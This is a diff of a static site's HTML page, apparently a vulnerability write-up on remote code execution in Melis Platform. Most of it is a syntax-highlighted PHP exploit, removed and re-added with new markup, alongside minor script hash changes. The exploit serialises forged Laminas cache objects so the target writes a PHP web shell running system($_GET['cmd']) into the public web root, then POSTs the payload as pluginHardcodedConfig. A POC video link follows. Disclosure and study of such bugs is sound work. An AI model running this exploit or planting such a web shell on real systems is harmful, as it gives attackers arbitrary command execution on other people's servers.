-        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
-        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_POSTFIELDS</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
-        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
-        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_PROXY</span><span class="p">,</span> <span class="s1">&#39;127.0.0.1:8080&#39;</span><span class="p">);</span> <span class="c1">//proxy
-</span><span class="c1"></span>        <span class="nx">printf</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
-        <span class="nv">$response</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
-        <span class="c1">// var_dump($response);
-</span><span class="c1"></span>        <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
-        <span class="k">return</span> <span class="nv">$response</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">function</span> <span class="nf">pwn</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$param</span><span class="p">){</span>
-        <span class="nv">$shell</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php if(isset($_GET[\&#39;cmd\&#39;])) { system($_GET[\&#39;cmd\&#39;]); } ?&gt;&#39;</span><span class="p">;</span>
-        
-
-        <span class="nv">$cache_item</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Laminas\Cache\Psr\CacheItemPool\CacheItem</span><span class="p">;</span>
-        <span class="nv">$cache_item</span><span class="o">-&gt;</span><span class="na">key</span><span class="o">=</span><span class="s2">&#34;shell&#34;</span><span class="p">;</span>
-        <span class="nv">$cache_item</span><span class="o">-&gt;</span><span class="na">value</span><span class="o">=</span><span class="nv">$shell</span><span class="p">;</span>
-
-        <span class="nv">$payload</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Laminas\Cache\Psr\CacheItemPool\CacheItemPoolDecorator</span><span class="p">;</span>
-        <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">storage</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Laminas\Cache\Storage\Adapter\Filesystem</span><span class="p">;</span>
-        <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">storage</span><span class="o">-&gt;</span><span class="na">options</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Laminas\Cache\Storage\Adapter\FilesystemOptions</span><span class="p">;</span>
-        <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">storage</span><span class="o">-&gt;</span><span class="na">options</span><span class="o">-&gt;</span> <span class="na">cacheDir</span> <span class="o">=</span> <span class="s2">&#34;/var/www/html/public&#34;</span><span class="p">;</span>
-        <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">storage</span><span class="o">-&gt;</span><span class="na">options</span><span class="o">-&gt;</span> <span class="na">dirLevel</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-        <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">storage</span><span class="o">-&gt;</span><span class="na">options</span><span class="o">-&gt;</span> <span class="na">suffix</span> <span class="o">=</span> <span class="s2">&#34;php&#34;</span><span class="p">;</span>
-        <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">storage</span><span class="o">-&gt;</span><span class="na">options</span><span class="o">-&gt;</span> <span class="na">namespace</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
-        <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">storage</span><span class="o">-&gt;</span><span class="na">options</span><span class="o">-&gt;</span> <span class="na">keyPattern</span> <span class="o">=</span> <span class="s2">&#34;/.*/&#34;</span><span class="p">;</span>
-
-        <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">deferred</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$cache_item</span><span class="p">);</span>
-
-        <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&#34;pluginHardcodedConfig=&#34;</span><span class="o">.</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
-        <span class="c1">// print($data);
-</span><span class="c1"></span>        <span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2"> [*] Inject Payload &#34;</span><span class="o">.</span><span class="nv">$data</span><span class="p">;</span>
-        <span class="nx">httpPost</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span><span class="nv">$data</span><span class="p">);</span>
-        <span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n\n\n</span><span class="s2"> [*] Successful!&#34;</span><span class="p">;</span>
-    <span class="p">}</span>
-
-<span class="c1">// Exploit Main
-</span><span class="c1"></span>    <span class="c1">// $url = $argv[1];
-</span><span class="c1"></span>    <span class="nv">$url</span> <span class="o">=</span> <span class="s2">&#34;http://www.mysite.local/news/id/2&#34;</span><span class="p">;</span>
-    <span class="nv">$param</span> <span class="o">=</span> <span class="s2">&#34;Hacked: by0d0ff9&#34;</span><span class="p">;</span>
-
-    <span class="nx">pwn</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$param</span><span class="p">);</span>
-
-<span class="p">}</span>
-
-<span class="cp">?&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Laminas\Cache\Psr\CacheItemPool</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">CacheItemPoolDecorator</span><span class="p">{}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">CacheItem</span><span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Laminas\Cache\Storage\Adapter</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Filesystem</span><span class="p">{}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">FilesystemOptions</span><span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">   
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">httpPost</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$curl</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_POST</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_POSTFIELDS</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="nx">CURLOPT_PROXY</span><span class="p">,</span> <span class="s1">&#39;127.0.0.1:8080&#39;</span><span class="p">);</span> <span class="c1">//proxy
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">printf</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$response</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// var_dump($response);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$response</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">pwn</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$param</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$shell</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php if(isset($_GET[\&#39;cmd\&#39;])) { system($_GET[\&#39;cmd\&#39;]); } ?&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$cache_item</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Laminas\Cache\Psr\CacheItemPool\CacheItem</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$cache_item</span><span class="o">-&gt;</span><span class="na">key</span><span class="o">=</span><span class="s2">&#34;shell&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$cache_item</span><span class="o">-&gt;</span><span class="na">value</span><span class="o">=</span><span class="nv">$shell</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$payload</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Laminas\Cache\Psr\CacheItemPool\CacheItemPoolDecorator</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">storage</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Laminas\Cache\Storage\Adapter\Filesystem</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">storage</span><span class="o">-&gt;</span><span class="na">options</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Laminas\Cache\Storage\Adapter\FilesystemOptions</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">storage</span><span class="o">-&gt;</span><span class="na">options</span><span class="o">-&gt;</span> <span class="na">cacheDir</span> <span class="o">=</span> <span class="s2">&#34;/var/www/html/public&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">storage</span><span class="o">-&gt;</span><span class="na">options</span><span class="o">-&gt;</span> <span class="na">dirLevel</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">storage</span><span class="o">-&gt;</span><span class="na">options</span><span class="o">-&gt;</span> <span class="na">suffix</span> <span class="o">=</span> <span class="s2">&#34;php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">storage</span><span class="o">-&gt;</span><span class="na">options</span><span class="o">-&gt;</span> <span class="na">namespace</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">storage</span><span class="o">-&gt;</span><span class="na">options</span><span class="o">-&gt;</span> <span class="na">keyPattern</span> <span class="o">=</span> <span class="s2">&#34;/.*/&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">deferred</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$cache_item</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&#34;pluginHardcodedConfig=&#34;</span><span class="o">.</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// print($data);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2"> [*] Inject Payload &#34;</span><span class="o">.</span><span class="nv">$data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">httpPost</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n\n\n</span><span class="s2"> [*] Successful!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Exploit Main
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// $url = $argv[1];
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$url</span> <span class="o">=</span> <span class="s2">&#34;http://www.mysite.local/news/id/2&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$param</span> <span class="o">=</span> <span class="s2">&#34;Hacked: by0d0ff9&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">pwn</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nv">$param</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><a href="/video/Reproduce-bug-Remote-Code-Execution-in-Melis-Platform/melis-php-deserialize.mp4">POC</a></p>
 <h2 id="v-references">V References</h2>
@@ -2706,7 +2704,7 @@ pluginHardcodedConfig=Ediscxxxxxx
 </div>
 
 
-<script defer src="/js/swipe.min.b4b82839155519d9ca67746615a4c86ccbc1061c196fe6d8aa26e4fe22902718.js"></script>
+<script defer src="/js/swipe.min.7be2debdadbc35f9430de39f9010d89df5aee1904747098818b5c01cd0672180.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3365,7 +3363,7 @@ document.addEventListener('DOMContentLoaded', function () {
       e.trigger.classList.add('tooltipped');
       e.trigger.classList.add('tooltipped-s');
     });
-    // =================================================================
+    
 
 
 
